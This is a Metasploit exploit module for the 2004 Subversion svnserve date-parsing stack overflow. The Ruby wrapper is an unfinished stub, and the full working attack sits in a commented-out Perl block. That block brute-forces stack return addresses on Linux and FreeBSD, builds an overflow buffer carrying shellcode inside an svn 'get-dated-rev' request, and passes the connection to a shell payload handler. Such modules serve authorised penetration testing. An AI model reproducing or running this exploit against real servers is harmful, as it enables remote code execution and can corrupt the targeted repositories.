require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Subversion Date Svnserve',
			'Description'    => %q{
				This is an exploit for the Subversion date parsing overflow.
				 This exploit is for the svnserve daemon (svn:// protocol)
				and will not work for Subversion over webdav (http[s]://). 
				This exploit should never crash the daemon, and should be
				safe to do multi-hits.

				**WARNING** This exploit seems to (not very often, I've only
				seen it during testing) corrupt the subversion database, so
				be careful!
					
			},
			'Author'         => [ 'spoonm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '6301'],
					[ 'URL', 'http://lists.netsys.com/pipermail/full-disclosure/2004-May/021737.html'],
					[ 'MIL', '68'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x09\x0a\x0b\x0c\x0d\x20",
					'MinNops'  => 16,

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'linux, bsd',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'May 19 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::svnserve_date;
use strict;
use base 'Msf::Exploit';
use Pex::Text;

my $advanced =
  {
	'StackTop'     => ['', 'Start address for stack ret bruteforcing, empty for defaults from target'],
	'StackBottom'  => ['', 'End address for stack ret bruteforcing, empty for defaults from target'],
	'StackStep'    => [0, 'Step size for ret bruteforcing, 0 for auto calculation.'],
	'BruteWait'    => [.4, 'Length in seconds to wait between bruteforce attempts'],

	# This was like 62 on my machine and 88 on HD's
	'RetLength'    => [100, 'Length of rets after payload'],
	'IgnoreErrors' => [0, 'Keep going even after critical errors.'],
  };

my $info = {
	'Name'    => 'Subversion Date Svnserve',
	'Version' => '$Revision$',
	'Authors' => [ 'spoonm <ninjatools [at] hush.com>', ],

	'Arch'    => [ 'x86' ],
	'OS'      => [ 'linux', 'bsd' ],
	'Priv'    => 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The svnserve port', 3690],
		'URL'   => [1, 'DATA', 'SVN URL (ie svn://host/repos)', 'svn://host/svn/repos'],
	  },

	'Payload' =>
	  {
		'Space'     => 500,
		'BadChars'  => "\x00\x09\x0a\x0b\x0c\x0d\x20",
		'MinNops'   => 16, # This keeps brute forcing sane
		'Keys'      => ['+findsock'],
	  },

	'Nop' =>
	  {
		'SaveRegs' => ['esp'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
      This is an exploit for the Subversion date parsing overflow.  This
      exploit is for the svnserve daemon (svn:// protocol) and will not work
      for Subversion over webdav (http[s]://).  This exploit should never
      crash the daemon, and should be safe to do multi-hits.

      **WARNING** This exploit seems to (not very often, I've only seen
      it during testing) corrupt the subversion database, so be careful!
}),

	'Refs'  =>
	  [
		['OSVDB', '6301'],
		['URL', 'http://lists.netsys.com/pipermail/full-disclosure/2004-May/021737.html'],
		['MIL', '68'],
	  ],

	'DefaultTarget' => -1,
	'Targets' =>
	  [
		['Linux Bruteforce', '0xbffffe13', '0xbfff0000'],
		['FreeBSD Bruteforce', '0xbfbffe13', '0xbfbf0000'],
	  ],

	'Keys'  => ['subversion'],

	'DisclosureDate' => 'May 19 2004',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

	return($self);
}

sub Exploit {
	my $self = shift;

	my $targetHost  = $self->GetVar('RHOST');
	my $targetPort  = $self->GetVar('RPORT');
	my $targetIndex = $self->GetVar('TARGET');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $shellcode   = $encodedPayload->Payload;
	my $target = $self->Targets->[$targetIndex];

	my $retLength   = $self->GetLocal('RetLength');
	my $bruteWait   = $self->GetLocal('BruteWait');
	my $stackTop    = $self->GetLocal('StackTop');
	my $stackBottom = $self->GetLocal('StackBottom');
	my $stackStep   = $self->GetLocal('StackStep');
	my $url         = $self->GetVar('URL');
	my $srcPort     = $self->GetVar('CPORT');

	$stackTop    = $target->[1] if(!length($stackTop));
	$stackBottom = $target->[2] if(!length($stackBottom));
	$stackTop    = hex($stackTop);
	$stackBottom = hex($stackBottom);

	$stackStep = $encodedPayload->NopsLength if($stackStep == 0);
	$stackStep -= $stackStep % 4; # ya ya, whatever

	for(my $ret = $stackTop; $ret >= $stackBottom; $ret = $self->StepAddress('Address' => $ret, 'StepSize' => $stackStep)) {
		my $sock = Msf::Socket::Tcp->new('PeerAddr' => $targetHost, 'PeerPort' => $targetPort, 'LocalPort' => $srcPort);
		if($sock->IsError) {
			$self->PrintLine('Error creating socket: ' . $sock->GetError);
			return;
		}

		$self->PrintLine(sprintf("Trying %#08x", $ret));
		my $evil = (pack('V', $ret) x int($retLength / 4)) . $shellcode;

		#    my $evil = 'A' x 300;

		my @data =  (
			'( 2 ( edit-pipeline ) ' . lengther($url) . ' ) ',
			'( ANONYMOUS ( 0: ) ) ',
			'( get-dated-rev ( ' .

#  lengther('Tue' . 'A' x $ARGV[0] . ' 3 Oct 2000 01:01:01.001 (day 277, dst 1, gmt_off -18000)') . ' ) ) '.
			  lengther($evil . ' 3 Oct 2000 01:01:01.001 (day 277, dst 1, gmt_off)') . ' ) ) ',
			'',
		  );

		my $i = 0;
		foreach my $data (@data) {
			my $dump = $sock->Recv(-1);
			$self->PrintDebugLine(3, "dump\n$dump");
			if(!$sock->Send($data) && $i < 3) {
				$self->PrintLine('Error in send.');
				$sock->PrintError;
				$self->PrintLine('This is bad.');
				$self->PrintLine("$dump\n");
				return if(!$self->GetLocal('IgnoreErrors'));
			}
			if($i == 3 && length($dump)) {
				$self->PrintLine("Received data when we should't have, bailing.");
				$self->PrintLine($dump);
				return if(!$self->GetLocal('IgnoreErrors'));
			}
			$i++;
		}

		select(undef, undef, undef, $bruteWait); # ghetto sleep
		$self->Handler($sock);
		$sock->Close;
		select(undef, undef, undef, 1) if($srcPort); # ghetto sleep, wait for CPORT
	}
	return;
}

sub lengther {
	my $data = shift;
	return(length($data) . ':' . $data);
}

1;

=end


end
end	
